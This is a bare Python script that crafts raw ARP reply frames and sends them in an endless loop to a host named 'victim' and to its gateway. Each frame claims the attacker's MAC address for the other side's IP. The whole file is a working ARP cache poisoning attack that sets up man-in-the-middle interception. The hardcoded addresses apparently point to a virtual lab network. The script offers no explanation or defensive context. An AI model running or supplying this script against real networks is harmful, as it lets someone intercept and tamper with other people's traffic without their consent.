import socket
import struct
import binascii
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))

attacker_mac = '\x08\x00\x27\x18\x77\x4c'
victim_mac ='\x08\x00\x27\xA6\xD1\x8A'
gate_mac = '\x52\x54\x00\x12\x35\x00'

code ='\x08\x06'

victim_header = victim_mac+attacker_mac+code
gate_header = gate_mac+attacker_mac+code

htype = '\x00\x01'
protype = '\x08\x00'

mac_size = '\x06'
ip_size = '\x04'

opcode = '\x00\x02'

gate_ip = '10.0.2.1'
victim_ip = '10.0.2.6'

gip = socket.inet_aton ( gate_ip )
vip = socket.inet_aton ( victim_ip )

arp_victim = victim_header+htype+protype+mac_size+ip_size+opcode+attacker_mac+gip+victim_mac+vip
arp_gateway= gate_header+htype+protype+mac_size+ip_size+opcode+attacker_mac+vip+gate_mac+gip

while 1:
    s.send(arp_victim)
    s.send(arp_gateway)
